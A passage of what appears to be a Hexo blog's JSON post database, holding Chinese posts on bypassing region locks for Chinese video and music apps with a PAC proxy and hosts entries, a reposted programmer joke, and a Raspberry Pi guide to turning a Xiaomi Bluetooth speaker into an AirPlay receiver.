https://github.com/yfgeek/rpi-TempRuntime.git</div></pre></td></tr></table></figure>\n<h1 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /var/www/html/rpi-TempRuntime</div><div class=\"line\">python LCD.py</div></pre></td></tr></table></figure>\n<h1 id=\"截图\"><a href=\"#截图\" class=\"headerlink\" title=\"截图\"></a>截图</h1><p><img src=\"/content/images/2016/08/WechatIMG10.jpeg\" alt=\"\"></p>\n"},{"title":"海外App生存指南","id":"12","updated":"2016-08-12T22:30:50.000Z","date":"2016-08-12T22:13:34.000Z","_content":"<!-- more --> \n# DNS/PAC大法\n## 优酷土豆爱奇艺\n在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：\n```bash\nhttp://pac.uku.im/pac.pac\n```\n\nDNS:\n```bash\n158.69.209.100\n```\n更新：https://github.com/uku/Unblock-Youku/issues/618\n# 替换hosts大法\n## 网易云音乐\n```bash\n104.236.189.178 http://music.163.com \n198.47.104.134 http://m1.music.126.net \n198.47.104.134 http://m2.music.126.net \n198.47.104.134 http://m3.music.126.net \n198.47.104.134 http://m4.music.126.net\n198.47.104.134 http://m5.music.126.net \n198.47.104.134 http://m6.music.126.net \n198.47.104.134 http://m7.music.126.net \n198.47.104.134 http://m8.music.126.net \n198.47.104.134 http://m9.music.126.net \n198.47.104.134 http://m10.music.126.net\n```\n","source":"_posts/海外App生存指南.md","raw":"---\ntitle: 海外App生存指南\ntags: '其他'\npermalink: hai-wai-appsheng-cun-zhi-nan\nid: 12\nupdated: '2016-08-12 23:30:50'\ndate: 2016-08-12 23:13:34\n---\n<!-- more --> \n# DNS/PAC大法\n## 优酷土豆爱奇艺\n在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：\n```bash\nhttp://pac.uku.im/pac.pac\n```\n\nDNS:\n```bash\n158.69.209.100\n```\n更新：https://github.com/uku/Unblock-Youku/issues/618\n# 替换hosts大法\n## 网易云音乐\n```bash\n104.236.189.178 http://music.163.com \n198.47.104.134 http://m1.music.126.net \n198.47.104.134 http://m2.music.126.net \n198.47.104.134 http://m3.music.126.net \n198.47.104.134 http://m4.music.126.net\n198.47.104.134 http://m5.music.126.net \n198.47.104.134 http://m6.music.126.net \n198.47.104.134 http://m7.music.126.net \n198.47.104.134 http://m8.music.126.net \n198.47.104.134 http://m9.music.126.net \n198.47.104.134 http://m10.music.126.net\n```\n","slug":"hai-wai-appsheng-cun-zhi-nan","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiskb2001k3sonqgvvityf","content":"<a id=\"more\"></a> \n<h1 id=\"DNS-PAC大法\"><a href=\"#DNS-PAC大法\" class=\"headerlink\" title=\"DNS/PAC大法\"></a>DNS/PAC大法</h1><h2 id=\"优酷土豆爱奇艺\"><a href=\"#优酷土豆爱奇艺\" class=\"headerlink\" title=\"优酷土豆爱奇艺\"></a>优酷土豆爱奇艺</h2><p>在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://pac.uku.im/pac.pac</div></pre></td></tr></table></figure></p>\n<p>DNS:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">158.69.209.100</div></pre></td></tr></table></figure></p>\n<p>更新：<a href=\"https://github.com/uku/Unblock-Youku/issues/618\" target=\"_blank\" rel=\"external\">https://github.com/uku/Unblock-Youku/issues/618</a></p>\n<h1 id=\"替换hosts大法\"><a href=\"#替换hosts大法\" class=\"headerlink\" title=\"替换hosts大法\"></a>替换hosts大法</h1><h2 id=\"网易云音乐\"><a href=\"#网易云音乐\" class=\"headerlink\" title=\"网易云音乐\"></a>网易云音乐</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">104.236.189.178 http://music.163.com </div><div class=\"line\">198.47.104.134 http://m1.music.126.net </div><div class=\"line\">198.47.104.134 http://m2.music.126.net </div><div class=\"line\">198.47.104.134 http://m3.music.126.net </div><div class=\"line\">198.47.104.134 http://m4.music.126.net</div><div class=\"line\">198.47.104.134 http://m5.music.126.net </div><div class=\"line\">198.47.104.134 http://m6.music.126.net </div><div class=\"line\">198.47.104.134 http://m7.music.126.net </div><div class=\"line\">198.47.104.134 http://m8.music.126.net </div><div class=\"line\">198.47.104.134 http://m9.music.126.net </div><div class=\"line\">198.47.104.134 http://m10.music.126.net</div></pre></td></tr></table></figure>\n","excerpt":"","more":"<h1 id=\"DNS-PAC大法\"><a href=\"#DNS-PAC大法\" class=\"headerlink\" title=\"DNS/PAC大法\"></a>DNS/PAC大法</h1><h2 id=\"优酷土豆爱奇艺\"><a href=\"#优酷土豆爱奇艺\" class=\"headerlink\" title=\"优酷土豆爱奇艺\"></a>优酷土豆爱奇艺</h2><p>在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://pac.uku.im/pac.pac</div></pre></td></tr></table></figure></p>\n<p>DNS:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">158.69.209.100</div></pre></td></tr></table></figure></p>\n<p>更新：<a href=\"https://github.com/uku/Unblock-Youku/issues/618\">https://github.com/uku/Unblock-Youku/issues/618</a></p>\n<h1 id=\"替换hosts大法\"><a href=\"#替换hosts大法\" class=\"headerlink\" title=\"替换hosts大法\"></a>替换hosts大法</h1><h2 id=\"网易云音乐\"><a href=\"#网易云音乐\" class=\"headerlink\" title=\"网易云音乐\"></a>网易云音乐</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">104.236.189.178 http://music.163.com </div><div class=\"line\">198.47.104.134 http://m1.music.126.net </div><div class=\"line\">198.47.104.134 http://m2.music.126.net </div><div class=\"line\">198.47.104.134 http://m3.music.126.net </div><div class=\"line\">198.47.104.134 http://m4.music.126.net</div><div class=\"line\">198.47.104.134 http://m5.music.126.net </div><div class=\"line\">198.47.104.134 http://m6.music.126.net </div><div class=\"line\">198.47.104.134 http://m7.music.126.net </div><div class=\"line\">198.47.104.134 http://m8.music.126.net </div><div class=\"line\">198.47.104.134 http://m9.music.126.net </div><div class=\"line\">198.47.104.134 http://m10.music.126.net</div></pre></td></tr></table></figure>"},{"title":"程序员鄙视链","date":"2016-10-12T14:07:48.000Z","_content":"# 编辑器\nEmacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad\n# 语言\nasm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all\n\n# 操作系统\nUnix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br>*BSD ↔ System*<br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian* → Redhat*<br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all\n# IDE\nEmacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0\n\n# 图片\n\n![](/content/images/chain/1.jpg)\n\n![](/content/images/chain/2.jpg)\n\n![](/content/images/chain/3.jpg)\n\n![](/content/images/chain/4.jpg)\n\n![](/content/images/chain/5.jpg)\n\n** 工具篇 **\n![](/content/images/chain/6.jpg)\n\n![](/content/images/chain/7.jpg)\n\n![](/content/images/chain/8.jpg)\n\n![](/content/images/chain/9.jpg)\n\n** 系统软件篇 **\n\n![](/content/images/chain/10.jpg)\n\n![](/content/images/chain/11.jpg)\n\n![](/content/images/chain/12.jpg)\n\n![](/content/images/chain/13.jpg)\n\n** 职场篇 **\n\n![](/content/images/chain/14.jpg)\n\n![](/content/images/chain/15.jpg)\n\n![](/content/images/chain/16.jpg)\n\n![](/content/images/chain/17.jpg)\n\n> 转载自：https://www.zhihu.com/question/24270600\n","source":"_posts/程序员鄙视链.md","raw":"---\ntitle: 程序员鄙视链\ndate: 2016-10-12 15:07:48\ntags: 笑话\ncategories: 笑话\n---\n# 编辑器\nEmacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad\n# 语言\nasm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all\n\n# 操作系统\nUnix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br>*BSD ↔ System*<br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian* → Redhat*<br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all\n# IDE\nEmacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0\n\n# 图片\n\n![](/content/images/chain/1.jpg)\n\n![](/content/images/chain/2.jpg)\n\n![](/content/images/chain/3.jpg)\n\n![](/content/images/chain/4.jpg)\n\n![](/content/images/chain/5.jpg)\n\n** 工具篇 **\n![](/content/images/chain/6.jpg)\n\n![](/content/images/chain/7.jpg)\n\n![](/content/images/chain/8.jpg)\n\n![](/content/images/chain/9.jpg)\n\n** 系统软件篇 **\n\n![](/content/images/chain/10.jpg)\n\n![](/content/images/chain/11.jpg)\n\n![](/content/images/chain/12.jpg)\n\n![](/content/images/chain/13.jpg)\n\n** 职场篇 **\n\n![](/content/images/chain/14.jpg)\n\n![](/content/images/chain/15.jpg)\n\n![](/content/images/chain/16.jpg)\n\n![](/content/images/chain/17.jpg)\n\n> 转载自：https://www.zhihu.com/question/24270600\n","slug":"程序员鄙视链","published":1,"updated":"2016-10-16T15:30:53.000Z","_id":"ciubiskb4001m3sonuxj9jx0q","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"编辑器\"><a href=\"#编辑器\" class=\"headerlink\" title=\"编辑器\"></a>编辑器</h1><p>Emacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad</p>\n<h1 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h1><p>asm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all</p>\n<h1 id=\"操作系统\"><a href=\"#操作系统\" class=\"headerlink\" title=\"操作系统\"></a>操作系统</h1><p>Unix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br><em>BSD ↔ System</em><br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian<em> → Redhat</em><br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all</p>\n<h1 id=\"IDE\"><a href=\"#IDE\" class=\"headerlink\" title=\"IDE\"></a>IDE</h1><p>Emacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0</p>\n<h1 id=\"图片\"><a href=\"#图片\" class=\"headerlink\" title=\"图片\"></a>图片</h1><p><img src=\"/content/images/chain/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/2.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/3.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/4.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/5.jpg\" alt=\"\"></p>\n<p><strong> 工具篇 </strong><br><img src=\"/content/images/chain/6.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/7.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/8.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/9.jpg\" alt=\"\"></p>\n<p><strong> 系统软件篇 </strong></p>\n<p><img src=\"/content/images/chain/10.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/11.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/12.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/13.jpg\" alt=\"\"></p>\n<p><strong> 职场篇 </strong></p>\n<p><img src=\"/content/images/chain/14.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/15.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/16.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/17.jpg\" alt=\"\"></p>\n<blockquote>\n<p>转载自：<a href=\"https://www.zhihu.com/question/24270600\" target=\"_blank\" rel=\"external\">https://www.zhihu.com/question/24270600</a></p>\n</blockquote>\n","excerpt":"","more":"<h1 id=\"编辑器\"><a href=\"#编辑器\" class=\"headerlink\" title=\"编辑器\"></a>编辑器</h1><p>Emacs → Vim → Sublime → Word → Power Point<br>Vim →→ Emacs + evil插件<br>notepad++ → notepad<br>all → Source Insight → notepad</p>\n<h1 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h1><p>asm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScript<br>Common Lisp ↔ Scheme → Emacs Lisp →→ Python<br>Python ↔ Perl → shell<br>PHP → all</p>\n<h1 id=\"操作系统\"><a href=\"#操作系统\" class=\"headerlink\" title=\"操作系统\"></a>操作系统</h1><p>Unix → Linux → Windows → DOS<br>Solaris →→ 其他Unix<br><em>BSD ↔ System</em><br>OpenBSD ↔ FreeBSD → NetBSD<br>Arch → Debian<em> → Redhat</em><br>Debian → Ubuntu<br>Fedora → CentOS → RHEL<br>OSX → all</p>\n<h1 id=\"IDE\"><a href=\"#IDE\" class=\"headerlink\" title=\"IDE\"></a>IDE</h1><p>Emacs + plugins ↔ Vim + plugins → 其他加插件的编辑器<br>IntelliJ → Eclipse → NetBeans<br>Code::Blocks → CodeLite<br>VS → all → Turbo C 2.0</p>\n<h1 id=\"图片\"><a href=\"#图片\" class=\"headerlink\" title=\"图片\"></a>图片</h1><p><img src=\"/content/images/chain/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/2.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/3.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/4.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/5.jpg\" alt=\"\"></p>\n<p><strong> 工具篇 </strong><br><img src=\"/content/images/chain/6.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/7.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/8.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/9.jpg\" alt=\"\"></p>\n<p><strong> 系统软件篇 </strong></p>\n<p><img src=\"/content/images/chain/10.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/11.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/12.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/13.jpg\" alt=\"\"></p>\n<p><strong> 职场篇 </strong></p>\n<p><img src=\"/content/images/chain/14.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/15.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/16.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/chain/17.jpg\" alt=\"\"></p>\n<blockquote>\n<p>转载自：<a href=\"https://www.zhihu.com/question/24270600\">https://www.zhihu.com/question/24270600</a></p>\n</blockquote>\n"},{"title":"用树莓派把蓝牙音响变成Airplay音响","id":"11","updated":"2016-08-07T22:28:30.000Z","date":"2016-08-07T20:23:56.000Z","_content":"\n# 前言\n最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。\n于是萌生了一个想法，正好手上有个树莓派，能不能这样：\n> iOS设备->Airplay->树莓派->蓝牙->小米蓝牙音箱\n<!-- more --> \n![](/content/images/2016/08/DSC07326-5.JPG)\n\n因此这个问题可以分为两个部分：\n\n* 1.树莓派蓝牙音频配置部分\n* 2.树莓派Airplay播放部分\n\n在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。\n\n# 原料\n* 树莓派3\n* 小米蓝牙音箱\n* iOS设备\n\n# 开始\n## 树莓派安装Shairport Sync\nShairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。\n安装前请确认是否安装以下依赖包：\n\n* `apt-get install build-essential git`\n* `apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev`\n* `apt-get install avahi-daemon libavahi-client-dev` \n* `apt-get install libssl-dev` \n* `apt-get install libpolarssl-dev` \n* `apt-get install libsoxr-dev` \n\n随后下载Shairport Sync：\n```bash\ngit clone https://github.com/mikebrady/shairport-sync.git\n```\n然后`cd`到相应目录，执行：\n```bash\nautoreconf -i -f\n```\n随后执行：\n```bash\n./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd\n```\n如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：\n```bash\nmake\n```\n创建开机启动：\n```bash\ngetent group shairport-sync &>/dev/null || sudo groupadd -r shairport-sync >/dev/null\n\ngetent passwd shairport-sync &> /dev/null || sudo useradd -r -M -g shairport-sync -s /usr/bin/nologin -G audio shairport-sync >/dev/null\n```\n然后运行：\n```bash\nsudo make install\n```\n最后输入，完成安装：\n```bash\nsudo update-rc.d shairport-sync defaults 90 10\n```\n## 树莓派安装蓝牙\n打开终端，用普通用户权限执行：\n```bash\nsudo apt-get update\nsudo apt-get updgrade -y\nsudo apt-get dist-upgrade -y\n```\n随后安装蓝牙及管理软件\n```bash\nsudo apt-get install pi-bluetooth bluez bluez-firmware blueman\n```\n将pi用户添加到蓝牙组\n```bash\nsudo usermod -G bluetooth -a pi\n```\n还有很**重要**的一条，安装蓝牙音频配置\n```bash\nsudo apt-get install pulseaudio pulseaudio-module-bluetooth\n```\n随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。\n也可通过bluetoothctl或hictool命令进行配对。\n随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。\n\n**在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。**\n## 配置蓝牙音频及Shariport Sync\n安装依赖包：\n```bash\nsudo apt-get install libdbus-1-dev\nsudo apt-get install libglib2.0-dev\napt-cache search libasound\nsudo apt-get install libasound2-dev\n```\n配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：\n```bash\nwget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz\ntar -xvf bluez-4.101.tar.xz\ncd bluez-4.101\n./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib\nmake\nsudo make install\n```\n复制配置文件到目录：\n```bash\nsudo cp /home/pi/bluez-4.101/test/simple-agent /usr/bin/bluez-simple-agent\nsudo cp /home/pi/bluez-4.101/test/test-device /usr/bin/bluez-test-device\nsudo cp /home/pi/bluez-4.101/test/test-audio /usr/bin/bluez-test-audio\nsudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/\n```\n接着运行：\n```bash\nsudo apt-get install python-dbus\nsudo apt-get install python-gobject\nsudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/\n```\n编辑audio.conf文件使shariport的音频从蓝牙设备输出：\n```bash\nsudo nano /etc/bluetooth/audio.conf\n```\n```bash\n# 在[General]区域添加:\nEnable=Sink,Socket\n# 取消[A2DP]注释，并加入:\nMaxconnections=4\n```\n打开蓝牙自启动:\n```bash\nsudo systemctl enable bluetooth\n```\n重启设备后，继续配置，打开asund.conf文件：\n```bash\nsudo nano /etc/asound.conf\n```\n```javascript\npcm.bt_canz {\ntype plug\nslave {\npcm {\ntype bluetooth\ndevice XX:XX:XX:XX:XX:XX\nprofile \"auto\"\n}\n}\nhint {\nshow on\ndescription \"Mi Speaker\"\n}\n}\nctl.bt_canz {\ntype bluetooth\n}\n```\n测试bluez能否使用：`sudo bluez-simple-agent\n`，如果正常，按ctrl+c停止。\n```bash\nsudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX\nsudo bluez-test-audio connect XX:XX:XX:XX:XX:XX\n```\n测试是否连通：`speaker-test -c 2 -D bt_canz`\n\n再次重启设备。\n开启后编辑`/etc/shairport-sync.conf `：\n```bash\nsudo nano /etc/shairport-sync.conf\n#去掉下面的注释，并加入bt_canz\noutput_device = bt_canz\n```\n保存！重启！开机即可用。\n![](/content/images/2016/08/IMG_0635.PNG)\n# 参考文章\nhttps://github.com/mikebrady/shairport-sync/issues/200\nhttps://github.com/mikebrady/shairport-sync\nhttp://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html\nhttp://wangye.org/blog/archives/921/\nhttp://blog.csdn.net/huayucong/article/details/51376461\nhttp://blog.csdn.net/zhaoqi_0612/article/details/47731821\nhttp://blog.csdn.net/techtitan/article/details/6165116\nhttp://www.eeboard.com/bbs/forum.php?mod=viewthread&tid=45040&page=1","source":"_posts/用树莓派把蓝牙音响变成Airplay音响.md","raw":"---\ntitle: 用树莓派把蓝牙音响变成Airplay音响\ntags: 'Raspberry'\npermalink: airplay\nid: 11\nupdated: '2016-08-07 23:28:30'\ndate: 2016-08-07 21:23:56\n---\n\n# 前言\n最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。\n于是萌生了一个想法，正好手上有个树莓派，能不能这样：\n> iOS设备->Airplay->树莓派->蓝牙->小米蓝牙音箱\n<!-- more --> \n![](/content/images/2016/08/DSC07326-5.JPG)\n\n因此这个问题可以分为两个部分：\n\n* 1.树莓派蓝牙音频配置部分\n* 2.树莓派Airplay播放部分\n\n在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。\n\n# 原料\n* 树莓派3\n* 小米蓝牙音箱\n* iOS设备\n\n# 开始\n## 树莓派安装Shairport Sync\nShairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。\n安装前请确认是否安装以下依赖包：\n\n* `apt-get install build-essential git`\n* `apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev`\n* `apt-get install avahi-daemon libavahi-client-dev` \n* `apt-get install libssl-dev` \n* `apt-get install libpolarssl-dev` \n* `apt-get install libsoxr-dev` \n\n随后下载Shairport Sync：\n```bash\ngit clone https://github.com/mikebrady/shairport-sync.git\n```\n然后`cd`到相应目录，执行：\n```bash\nautoreconf -i -f\n```\n随后执行：\n```bash\n./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd\n```\n如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：\n```bash\nmake\n```\n创建开机启动：\n```bash\ngetent group shairport-sync &>/dev/null || sudo groupadd -r shairport-sync >/dev/null\n\ngetent passwd shairport-sync &> /dev/null || sudo useradd -r -M -g shairport-sync -s /usr/bin/nologin -G audio shairport-sync >/dev/null\n```\n然后运行：\n```bash\nsudo make install\n```\n最后输入，完成安装：\n```bash\nsudo update-rc.d shairport-sync defaults 90 10\n```\n## 树莓派安装蓝牙\n打开终端，用普通用户权限执行：\n```bash\nsudo apt-get update\nsudo apt-get updgrade -y\nsudo apt-get dist-upgrade -y\n```\n随后安装蓝牙及管理软件\n```bash\nsudo apt-get install pi-bluetooth bluez bluez-firmware blueman\n```\n将pi用户添加到蓝牙组\n```bash\nsudo usermod -G bluetooth -a pi\n```\n还有很**重要**的一条，安装蓝牙音频配置\n```bash\nsudo apt-get install pulseaudio pulseaudio-module-bluetooth\n```\n随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。\n也可通过bluetoothctl或hictool命令进行配对。\n随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。\n\n**在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。**\n## 配置蓝牙音频及Shariport Sync\n安装依赖包：\n```bash\nsudo apt-get install libdbus-1-dev\nsudo apt-get install libglib2.0-dev\napt-cache search libasound\nsudo apt-get install libasound2-dev\n```\n配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：\n```bash\nwget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz\ntar -xvf bluez-4.101.tar.xz\ncd bluez-4.101\n./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib\nmake\nsudo make install\n```\n复制配置文件到目录：\n```bash\nsudo cp /home/pi/bluez-4.101/test/simple-agent /usr/bin/bluez-simple-agent\nsudo cp /home/pi/bluez-4.101/test/test-device /usr/bin/bluez-test-device\nsudo cp /home/pi/bluez-4.101/test/test-audio /usr/bin/bluez-test-audio\nsudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/\n```\n接着运行：\n```bash\nsudo apt-get install python-dbus\nsudo apt-get install python-gobject\nsudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/\n```\n编辑audio.conf文件使shariport的音频从蓝牙设备输出：\n```bash\nsudo nano /etc/bluetooth/audio.conf\n```\n```bash\n# 在[General]区域添加:\nEnable=Sink,Socket\n# 取消[A2DP]注释，并加入:\nMaxconnections=4\n```\n打开蓝牙自启动:\n```bash\nsudo systemctl enable bluetooth\n```\n重启设备后，继续配置，打开asund.conf文件：\n```bash\nsudo nano /etc/asound.conf\n```\n```javascript\npcm.bt_canz {\ntype plug\nslave {\npcm {\ntype bluetooth\ndevice XX:XX:XX:XX:XX:XX\nprofile \"auto\"\n}\n}\nhint {\nshow on\ndescription \"Mi Speaker\"\n}\n}\nctl.bt_canz {\ntype bluetooth\n}\n```\n测试bluez能否使用：`sudo bluez-simple-agent\n`，如果正常，按ctrl+c停止。\n```bash\nsudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX\nsudo bluez-test-audio connect XX:XX:XX:XX:XX:XX\n```\n测试是否连通：`speaker-test -c 2 -D bt_canz`\n\n再次重启设备。\n开启后编辑`/etc/shairport-sync.conf `：\n```bash\nsudo nano /etc/shairport-sync.conf\n#去掉下面的注释，并加入bt_canz\noutput_device = bt_canz\n```\n保存！重启！开机即可用。\n![](/content/images/2016/08/IMG_0635.PNG)\n# 参考文章\nhttps://github.com/mikebrady/shairport-sync/issues/200\nhttps://github.com/mikebrady/shairport-sync\nhttp://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html\nhttp://wangye.org/blog/archives/921/\nhttp://blog.csdn.net/huayucong/article/details/51376461\nhttp://blog.csdn.net/zhaoqi_0612/article/details/47731821\nhttp://blog.csdn.net/techtitan/article/details/6165116\nhttp://www.eeboard.com/bbs/forum.php?mod=viewthread&tid=45040&page=1","slug":"airplay","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiskb6001o3soniovczzbb","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。<br>于是萌生了一个想法，正好手上有个树莓派，能不能这样：</p>\n<blockquote>\n<p>iOS设备-&gt;Airplay-&gt;树莓派-&gt;蓝牙-&gt;小米蓝牙音箱<br><a id=\"more\"></a><br><img src=\"/content/images/2016/08/DSC07326-5.JPG\" 